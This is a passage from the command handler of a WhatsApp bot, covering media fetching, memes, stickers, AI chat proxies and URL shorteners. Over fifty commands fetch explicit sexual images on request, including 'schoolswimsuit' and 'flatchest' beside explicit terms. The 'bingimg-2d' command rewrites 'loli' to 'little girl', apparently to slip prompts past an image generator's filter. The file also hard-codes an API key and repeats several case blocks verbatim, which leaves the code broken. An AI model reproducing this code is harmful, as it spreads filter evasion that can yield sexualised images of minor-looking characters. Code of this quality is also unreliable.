                caption: `*Fetched:* ${text}`,
            }, { quoted: m });
        } else {
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: tempFilePath },
                mimetype: contentType,
                fileName: fileName,
                caption: `*Fetched:* ${text}`,
            }, { quoted: m });
        }

        // Cleanup: Delete the temporary file after sending
        fs.unlinkSync(tempFilePath);
    } catch (error) {
        console.error('Error in fetch command:', error.message);
        replyphistar(`*Failed to fetch the requested resource. Possible reasons:*
1. Invalid URL or download link
2. The server rejected the request
3. The file type isn't supported.

*Error Details:* ${error.message}`);
    }
    break;
}
case 'animevideo':
case 'amv': {
    if (!text) return replyphistar('Enter the number\nExample: .animevideo 1');

    async function animeVideo() {
        const url = 'https://shortstatusvideos.com/anime-video-status-download/';
        const response = await fetch(url);
        const html = await response.text();
        const $ = cheerio.load(html);
        const videos = [];
        $('a.mks_button.mks_button_small.squared').each((index, element) => {
            const href = $(element).attr('href');
            const title = $(element).closest('p').prevAll('p').find('strong').text();
            videos.push({
                title,
                source: href
            });
        });

        const randomIndex = Math.floor(Math.random() * videos.length);
        const randomVideo = videos[randomIndex];

        return randomVideo;
    }

    async function animeVideo2() {
        const url = 'https://mobstatus.com/anime-whatsapp-status-video/';
        const response = await fetch(url);
        const html = await response.text();
        const $ = cheerio.load(html);

        const videos = [];
        const title = $('strong').text();

        $('a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy').each((index, element) => {
            const href = $(element).attr('href');
            videos.push({
                title,
                source: href
            });
        });

        const randomIndex = Math.floor(Math.random() * videos.length);
        const randomVideo = videos[randomIndex];

        return randomVideo;
    }

    if (text == '1') {
        try {
            let resl = await animeVideo();
            let cap = `Here's the video`;
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: resl.source },
                caption: cap
            }, { quoted: m });
        } catch (e) {
            await replyphistar('Error occurred while fetching the video.');
        }
    }
    if (text == '2') {
        try {
            let resl = await animeVideo2();
            let cap = `Here's the video`;
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: resl.source },
                caption: cap
            }, { quoted: m });
        } catch (e) {
            await replyphistar('Error occurred while fetching the video.');
        }
    }
}
break;

case 'creatememe': {
    const memeImageUrl = args[0];
    const topText = args[1];
    const bottomText = args[2];
    if (!memeImageUrl || !topText || !bottomText) return replyphistar('Usage: .creatememe [image URL] [top text] [bottom text]');

    try {
        const response = await axios.get(`https://api.memegen.link/images/custom/${encodeURI(topText)}/${encodeURI(bottomText)}.jpg?background=${memeImageUrl}`, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'binary');
        await PhistarBotInc.sendMessage(m.chat, {
            image: buffer,
            caption: 'Here is your meme!'
        }, { quoted: m });
    } catch (error) {
        console.error('Error generating meme:', error.message);
        replyphistar('Could not create meme. Please check the image URL and try again.');
    }
    break;
}
case 'volvid': {
    const { TelegraPh } = require('./lib/uploader');
    const fs = require('fs');

    const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? PhistarBotInc.user.jid : m.sender;
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';

    if (!mime || !mime.includes('video')) return replyphistar(`Where is the video?`);

    const volume = parseFloat(args[0]) || 1;
    if (isNaN(volume) || volume <= 0) return replyphistar('Specify a valid volume (example: 0.5 for half, 2 for double)');

    replyphistar(`loading....`);

    try {
        const media = await PhistarBotInc.downloadAndSaveMediaMessage(q);
        const output = 'output.mp4';

        ffmpeg(media)
            .audioFilters(`volume=${volume}`)
            .on('start', (commandLine) => {
                console.log(`Spawned Ffmpeg with command: ${commandLine}`);
            })
            .on('error', async (err) => {
                console.error(`Error: ${err.message}`);
                await fs.promises.unlink(media).catch(console.error);
                return replyphistar(`Error: ${err.message}`);
            })
            .on('end', async () => {
                console.log('Video processed');

                try {
                    const url = await TelegraPh(output);
                    await fs.promises.unlink(output);
                    await fs.promises.unlink(media);

                    await PhistarBotInc.sendMessage(m.chat, {
                        video: { url },
                        caption: `_Success To Change Video Volume_`
                    }, { quoted: m });
                } catch (err) {
                    console.error(`Error When Upload Video: ${err.message}`);
                    await fs.promises.unlink(media).catch(console.error);
                    return replyphistar(`Error When Uploading Video: ${err.message}`);
                }
            })
            .save(output);
    } catch (err) {
        console.error(`Error When Uploading Video: ${err.message}`);
        return replyphistar(`Error When Uploading Video: ${err.message}`);
    }
}
break;

//NEW COMMANDS FOR V3
case "copilot": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/copilot?text=${encodeURIComponent(text)}`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "githubroaster": {
    if (!text) return replyphistar(`❌ Give Me A Github Username`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai-persona/githubroaster?username=${encodeURIComponent(text)}`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "nemotron": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=nemotron-70b`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "qwen2": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=qwen-2.5-72b`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "llama3.3": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=llama-3.3-70b`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "command-r-plus": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=command-r-plus`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "qwq": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=qwq-32b`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "qwen2coder": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=qwen-2.5-coder-32b`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "hermes-3": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=hermes-3`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "mistral-nemo": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=mistral-nemo`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "phi-3": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=phi-3.5-mini`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "lori": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai-persona/lori?text=${encodeURIComponent(text)}`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "goody": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai-persona/goody2?text=${encodeURIComponent(text)}`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "human": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai-persona/human?text=${encodeURIComponent(text)}`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;
case 'alert': {
    if (!text) {
        return replyphistar(`*Usage:* .alert <your text>\n\n*Example:* .alert This is an alert!`);
    }

    try {
        const apiResponse = await axios.get(`https://api.popcat.xyz/alert`, {
            params: { text }
        });

        if (apiResponse.status === 200) {
            const alertImageUrl = apiResponse.request.res.responseUrl;

            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: alertImageUrl },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`*ALERT GENERATION ERROR!! MESSAGE :*\n\n> Failed to generate an alert image. Try again.`);
        }
    } catch (error) {
        console.error('Error in Alert command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
}
break;

case 'listblock': {
    if (!isCreator) return replyphistar(`For My Owner Only`);
    let block = await PhistarBotInc.fetchBlocklist();
    replyphistar('List Block :\n\n' + `Total : ${block == undefined ? '*0* Blocked' : '*' + block.length + '* Blocked'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`);
}
break;

case 'genshin':
case 'swimsuit':
case 'schoolswimsuit':
case 'white':
case 'barefoot':
case 'touhou':
case 'gamecg':
case 'hololive':
case 'uncensored':
case 'sungglasses':
case 'glasses':
case 'weapon':
case 'shirtlift':
case 'chain':
case 'fingering':
case 'flatchest':
case 'torncloth':
case 'bondage':
case 'demon':
case 'pantypull':
case 'headdress':
case 'headphone':
case 'anusview':
case 'shorts':
case 'stokings':
case 'topless':
case 'beach':
case 'bunnygirl':
case 'bunnyear':
case 'vampire':
case 'nobra':
case 'bikini':
case 'whitehair':
case 'blonde':
case 'pinkhair':
case 'bed':
case 'ponytail':
case 'nude':
case 'dress':
case 'underwear':
case 'foxgirl':
case 'uniform':
case 'skirt':
case 'breast':
case 'twintail':
case 'spreadpussy':
case 'seethrough':
case 'breasthold':
case 'fateseries':
case 'spreadlegs':
case 'openshirt':
case 'headband':
case 'nipples':
case 'erectnipples':
case 'greenhair':
case 'wolfgirl':
case 'catgirl': {
    try {
        let res = await fetch(`https://fantox-apis.vercel.app/${command}`);
        if (!res.ok) throw `API error: ${res.status}`;

        let json = await res.json();
        if (!json.url) throw `No URL found in the API response.`;

        let imageRes = await fetch(json.url);
        if (!imageRes.ok) throw `Failed to fetch image: ${imageRes.status}`;
        let buffer = await imageRes.buffer();

        await PhistarBotInc.sendMessage(
            m.chat,
            { image: buffer, caption: `*Generated*` },
            { quoted: m }
        );
    } catch (error) {
        console.error(error);
        replyphistar(`An error occurred: ${error.message || error}`);
    }
}
break;

case 'smeme': {
    let respond = `Send/reply image/sticker with caption ${prefix + command} text1|text2`;
    if (!/image/.test(mime)) return replyphistar(respond);
    if (!text) return replyphistar(respond);
    try {
        let atas = text.split('|')[0] ? text.split('|')[0] : '-';
        let bawah = text.split('|')[1] ? text.split('|')[1] : '-';
        let dwnld = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg);
        let fatGans = await TelegraPH(dwnld);
        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`;
        let FaTiH = await PhistarBotInc.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(dwnld);
    } catch (e) {
        console.error(e);
    }
}
break;

case 'imgsearch': case 'img': {
    if (!text) {
        return replyphistar(`*Usage:* .bingimg <query>\n\n*Example:* .img cat`);
    }

    try {
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/s/bimg`, {
            params: { query: text }
        });

        if (apiResponse.status === 200 && apiResponse.data.status) {
            const images = apiResponse.data.data;

            if (images.length === 0) {
                return replyphistar(`No images found for "${text}". Please try another query.`);
            }

            const maxImages = Math.min(images.length, 5);
            for (let i = 0; i < maxImages; i++) {
                await PhistarBotInc.sendMessage(m.chat, {
                    image: { url: images[i] },
                    caption: `🔎Image Search\n\n📄 Query: "${text}"\n📷 Image ${i + 1}/${maxImages}\n\n> Generated`
                }, { quoted: m });
            }
        } else {
            replyphistar(`*ERROR!! MESSAGE :*\n\n> Failed to fetch images. Try again.`);
        }
    } catch (error) {
        console.error('Error in Image Search command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
}
break;

case 'bingimg-2d': {
    if (!text) return replyphistar("[ ! ] Enter the image prompt you want to create");
    let teksu = text.replace(/loli/gi, "little girl");
    try {
        const { BingApi, apikeybing } = require('./lib/bing-image.js');
        const bingApi = new BingApi(apikeybing);
        const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
        const totalCount = imagesUrls.length;
        const credits = await bingApi.getCredits();

        if (totalCount > 0) {
            for (let i = 0; i < totalCount; i++) {
                try {
                    await new Promise(resolve => setTimeout(resolve, i * 6000));
                    await PhistarBotInc.sendMessage(m?.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted: fsaluran });
                } catch (error) {
                    console.error(`Error sending file: ${error.message}`);
                    await replyphistar(`Failed to send image *(${i + 1}/${totalCount})*`);
                }
            }
        } else {
            await replyphistar('No images found after filtering.');
        }
    } catch (error) {
        await replyphistar('An error occurred while processing the request.');
    }
}
break;

case 'delete': case 'del': case 'd': {
    let key = {};
    try {
        key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid;
        key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe;
        key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id;
        key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant;
    } catch (e) {
        console.error(e);
    }
    PhistarBotInc.sendMessage(m.chat, { delete: key });
}
break;

case 'leavegc': {
    if (!isCreator) return replyphistar('`This Command Is For My Owner Only`');
    await PhistarBotInc.groupLeave(m.chat);
    await replyphistar('`Done!`');
}
break;

case 'gptgo': {
    if (!text) return replyphistar(`*Example : ${prefix + command} Hello*`);
    var js = await fetch(`https://widipe.com/gptgo?text=${q}`);
    var json = await js.json();
    let que = "`";
    replyphistar(`${que}Gpt-Go${que}\n\n ${json.result}`);
}
break;

case 'nevo': {
    if (!text) return replyphistar('What do you want to ask?');
    let dataa = await fetchJson(`https://ai.nevolution.team/nevo?apikey=akbarrdev&prompt=${text}`);
    let unvo = dataa.response;
    replyphistar(unvo);
}
break;

case 'npmstalk': {
    if (!q) return replyphistar(`Example ${prefix + command} xeonapi`);

    let npmstalk = require('./lib/scraper');
    eha = await npmstalk.npmstalk(q);
    replyphistar(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`);
}
break;

case 'tagall': {
    if (!m.isGroup) return replyphistar('ɢʀᴏᴜᴘ ᴏɴʟʏ');
    if (!isAdmins) return replyphistar('ғᴏʀ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴ ᴏɴʟʏ');

    let teks = `〘      *Tag All*     〙
 •• *Message : ${q ? q : 'empty'}* ••\n\n`;
    for (let mem of participants) {
        teks += `☌  @${mem.id.split('@')[0]}\n`;
    }
    PhistarBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m });
}
break;

case 'ffstalk': {
    if (!args[0]) return replyphistar('❌ Please provide a Free Fire ID. Example: .ffstalk 8533270051');

    const ffId = args[0];
    const apiUrl = `https://apis.davidcyriltech.my.id/ffstalk?id=${ffId}`;

    try {
        await PhistarBotInc.sendMessage(m?.chat, { react: { text: `🔍`, key: m?.key } });

        const response = await axios.get(apiUrl);
        const data = response.data;

        if (!data.success) return replyphistar('❌ Failed to fetch data. Please check the ID and try again.');

        const {
            name, level, xp, region, likes, created_at, last_login, honor_score,
            booyah_pass, BR_points, CS_points
        } = data.account;

        const guild = data.guild ? `\n🏴 Guild: ${data.guild.name} (Level: ${data.guild.level})` : '';

        const message = `
🎮 *Free Fire Profile* 🎮
━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
🆔 *ID:* ${ffId}
⭐ *Level:* ${level} (XP: ${xp})
🌍 *Region:* ${region}
👍 *Likes:* ${likes}
📅 *Created:* ${created_at}
⏳ *Last Login:* ${last_login}
🛡 *Honor Score:* ${honor_score}
🔥 *Booyah Pass:* ${booyah_pass}
🏆 *Battle Royale Points:* ${BR_points}
⚔️ *Clash Squad Points:* ${CS_points}
${guild}
━━━━━━━━━━━━━━━━━
    `;
        await PhistarBotInc.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });

        replyphistar(message);
    } catch (error) {
        console.error('FF Stalk Error:', error);
        replyphistar('❌ An error occurred while fetching data. Please try again later.');
    }
}
break;
case 'bitly': {
    if (!args[0]) return replyphistar('Please provide a URL to shorten.');
    let apiUrl = `https://apis.davidcyriltech.my.id/bitly?link=${encodeURIComponent(args[0])}`;

    try {
        let response = await fetch(apiUrl);
        let jsonData = await response.json();
        if (jsonData.success) {
            replyphistar(`🔗 *Shortened URL:* ${jsonData.shortened_url}`);
        } else {
            replyphistar('Failed to shorten URL using Bitly.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('Error processing your request.');
    }
}
break;

case 'shorturl': {
    if (!args[0]) return replyphistar('Please provide a URL to shorten.');
    let apiUrl = `https://apis.davidcyriltech.my.id/shorten?url=${encodeURIComponent(args[0])}`;

    try {
        let response = await fetch(apiUrl);
        let jsonData = await response.json();
        if (jsonData.success) {
            replyphistar(`🔗 *Shortened URL:* ${jsonData.shortUrl}`);
        } else {
            replyphistar('Failed to shorten URL using TinyURL.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('Error processing your request.');
    }
}
break;

case 'cuttly': {
    if (!args[0]) return replyphistar('Please provide a URL to shorten.');
    let apiUrl = `https://apis.davidcyriltech.my.id/cuttly?link=${encodeURIComponent(args[0])}`;

    try {
        let response = await fetch(apiUrl);
        let jsonData = await response.json();
        if (jsonData.success) {
            replyphistar(`🔗 *Shortened URL:* ${jsonData.shortened_url}`);
        } else {
            replyphistar('Failed to shorten URL using Cutt.ly.');
        }
    } catch (error) {
        console.error(error);
        replyphistar('Error processing your request.');
    }
}
break;

case 'petgif': {
    try {
        let imageUrl;

        if (/image/.test(mime)) {
            const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
            const uploadResponse = await uploadToImgur(mediaPath);
            if (uploadResponse.status !== "success") {
                fs.unlinkSync(mediaPath);
                return replyphistar(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
            }
            imageUrl = uploadResponse.fileUrl;
            fs.unlinkSync(mediaPath);
        } else if (m.message.extendedTextMessage && m.message.extendedTextMessage.contextInfo && m.message.extendedTextMessage.contextInfo.mentionedJid) {
            const mentionedJid = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
            imageUrl = await PhistarBotInc.profilePictureUrl(mentionedJid, 'image').catch(() => 'https://cdn.popcat.xyz/avatar.png');
        } else {
            return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image or mention a user with .petgif to create a petting GIF*`);
        }

        const apiResponse = await axios.get(`https://api.popcat.xyz/pet`, {
            params: { image: imageUrl }
        });

        if (apiResponse.status === 200) {
            const petGifUrl = apiResponse.request.res.responseUrl;

            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: petGifUrl },
                mimetype: 'video/mp4',
                caption: `*Petting GIF Generated Successfully!* 🐾`
            }, { quoted: m });
        } else {
            replyphistar(`*PET GIF ERROR!! MESSAGE :*\n\n> Failed to create a petting GIF. Try again.`);
        }
    } catch (error) {
        console.error('Error in Petgif command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
}
break;

case 'take': {
    if (!m?.quoted) return replyphistar('Reply with a sticker!');
    let stiker = false;
    try {
        let [packname, ...author] = text.split('|');
        author = (author || []).join('|');
        let mime = m?.quoted.mimetype || '';
        if (!/webp/.test(mime)) throw 'Reply with a sticker!';
        let img = await m?.quoted.download();
        if (!img) throw 'Failed to download sticker!';
        stiker = await addExif(img, packname || global.packname, author || global.author);
    } catch (e) {
        console.error(e);
        if (Buffer.isBuffer(e)) stiker = e;
        else throw 'An error occurred: ' + e;
    } finally {
        if (stiker) PhistarBotInc.sendMessage(m?.chat, { sticker: stiker }, { quoted: m });
        else throw 'Conversion failed';
    }
}
break;

case 'alert': {
    if (!text) {
        return replyphistar(`*Usage:* .alert <your text>\n\n*Example:* .alert This is an alert!`);
    }

    try {
        const apiResponse = await axios.get(`https://api.popcat.xyz/alert`, {
            params: { text }
        });

        if (apiResponse.status === 200) {
            const alertImageUrl = apiResponse.request.res.responseUrl;

            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: alertImageUrl },
                caption: `\n> Generated`,
            }, { quoted: m });
        } else {
            replyphistar(`*ALERT GENERATION ERROR!! MESSAGE :*\n\n> Failed to generate an alert image. Try again.`);
        }
    } catch (error) {
        console.error('Error in Alert command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
}
break;

case 'listblock': {
    if (!isCreator) return replyphistar(`For My Owner Only`);
    let block = await PhistarBotInc.fetchBlocklist();
    replyphistar('List Block :\n\n' + `Total : ${block == undefined ? '*0* Blocked' : '*' + block.length + '* Blocked'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`);
}
break;

case 'genshin':
case 'swimsuit':
case 'schoolswimsuit':
case 'white':
case 'barefoot':
case 'touhou':
case 'gamecg':
case 'hololive':
case 'uncensored':
case 'sungglasses':
case 'glasses':
case 'weapon':
case 'shirtlift':
case 'chain':
case 'fingering':
case 'flatchest':
case 'torncloth':
case 'bondage':
case 'demon':
case 'pantypull':
case 'headdress':
case 'headphone':
case 'anusview':
case 'shorts':
case 'stokings':
case 'topless':
case 'beach':
case 'bunnygirl':
case 'bunnyear':
case 'vampire':
case 'nobra':
case 'bikini':
case 'whitehair':
case 'blonde':
case 'pinkhair':
case 'bed':
case 'ponytail':
case 'nude':
case 'dress':
case 'underwear':
case 'foxgirl':
case 'uniform':
case 'skirt':
case 'breast':
case 'twintail':
case 'spreadpussy':
case 'seethrough':
case 'breasthold':
case 'fateseries':
case 'spreadlegs':
case 'openshirt':
case 'headband':
case 'nipples':
case 'erectnipples':
case 'greenhair':
case 'wolfgirl':
case 'catgirl': {
    try {
        let res = await fetch(`https://fantox-apis.vercel.app/${command}`);
        if (!res.ok) throw `API error: ${res.status}`;

        let json = await res.json();
        if (!json.url) throw `No URL found in the API response.`;

        let imageRes = await fetch(json.url);
        if (!imageRes.ok) throw `Failed to fetch image: ${imageRes.status}`;
        let buffer = await imageRes.buffer();

        await PhistarBotInc.sendMessage(
            m.chat,
            { image: buffer, caption: `*Generated*` },
            { quoted: m }
        );
    } catch (error) {
        console.error(error);
        replyphistar(`An error occurred: ${error.message || error}`);
    }
}
break;

case 'smeme': {
    let respond = `Send/reply image/sticker with caption ${prefix + command} text1|text2`;
    if (!/image/.test(mime)) return replyphistar(respond);
    if (!text) return replyphistar(respond);
    try {
        let atas = text.split('|')[0] ? text.split('|')[0] : '-';
        let bawah = text.split('|')[1] ? text.split('|')[1] : '-';
        let dwnld = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg);
        let fatGans = await TelegraPH(dwnld);
        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`;
        let FaTiH = await PhistarBotInc.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(dwnld);
    } catch (e) {
        console.error(e);
    }
}
break;
case 'qc': {
    const { quote } = require('./lib/quote.js');
    let text;
    if (args.length >= 1) {
        text = args.slice(0).join(" ");
    } else if (m?.quoted && m?.quoted.text) {
        text = m?.quoted.text;
    } else return replyphistar("Input text or reply text that you want to make a quote!");
    if (!text) return replyphistar('Input text');
    if (text.length > 30) return replyphistar('Maximum 30 Teks!');
    let ppnyauser = await PhistarBotInc.profilePictureUrl(m?.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg');
    const rest = await quote(text, pushname, ppnyauser);
    await PhistarBotInc.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

case 'sticker':
case 'stiker':
case 's': {
    if (!quoted) return replyphistar(`Reply to an image or video with caption ${prefix + command}`);
    if (/image/.test(mime)) {
        const media = await quoted.download();
        await PhistarBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return replyphistar('Maximum 10 seconds!');
        const media = await quoted.download();
        await PhistarBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
    } else {
        return replyphistar(`Send an image or video with caption ${prefix + command}. Video should be 1-9 seconds.`);
    }
}
break;

case 'stickersearch':
case 'stickerpack': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <search-query>\nE.g., ${prefix + command} comrade`);

    try {
        await replyphistar(`🔍 *Searching and sending stickers...*\nPlease wait.`);
        const apiUrl = `https://www.dark-yasiya-api.site/download/sticker?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        const { status, result } = response.data;
        if (!status || !result || !result.stickers) {
            return replyphistar(`❌ No stickers found for the query: *${text}*.`);
        }

        const { stickers } = result;

        for (const stickerUrl of stickers) {
            const media = await axios.get(stickerUrl, { responseType: 'arraybuffer' });
            await PhistarBotInc.sendImageAsSticker(m.chat, Buffer.from(media.data), m, {
                packname: global.packname || 'Sticker Pack',
                author: global.author || 'Sticker Bot',
            });
        }

        replyphistar(`🎉 *All stickers from the "${text}" pack have been sent!*\nEnjoy!`);
    } catch (error) {
        console.error('Error fetching stickers:', error.message);
        replyphistar(`❌ An error occurred while fetching stickers. Please try again.`);
    }
}
break;
case 'lyrics': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} faded | Alan Walker`);

    try {
        const [title, artist] = text.split('|').map(str => str.trim());
        if (!title || !artist) return replyphistar(`*Please provide both song title and artist, e.g.:* ${prefix + command} faded | Alan Walker`);

        await PhistarBotInc.sendMessage(m.chat, { react: { text: `🎶`, key: m.key } });
        await replyphistar(`Searching For Lyrics`);
        const apiUrl = `https://apis.davidcyriltech.my.id/lyrics?t=${encodeURIComponent(title)}&a=${encodeURIComponent(artist)}`;
        const response = await axios.get(apiUrl);

        if (response.data && response.data.lyrics) {
            const { title, artist, lyrics } = response.data;

